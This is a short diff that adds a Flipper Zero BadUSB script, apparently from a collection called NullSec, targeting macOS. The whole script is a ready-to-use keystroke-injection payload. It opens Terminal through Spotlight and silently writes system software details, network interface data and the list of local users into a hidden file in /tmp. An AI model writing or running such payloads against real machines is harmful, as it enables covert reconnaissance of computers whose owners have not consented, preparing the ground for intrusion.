@@ -1,0 +1,13 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: macOS System Recon
+REM Target: macOS
+REM ========================================
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+STRING echo "=== SYSTEM ===" > /tmp/.recon.txt; system_profiler SPSoftwareDataType >> /tmp/.recon.txt; echo "=== NETWORK ===" >> /tmp/.recon.txt; ifconfig >> /tmp/.recon.txt; echo "=== USERS ===" >> /tmp/.recon.txt; dscl . list /Users >> /tmp/.recon.txt; exit
+ENTER
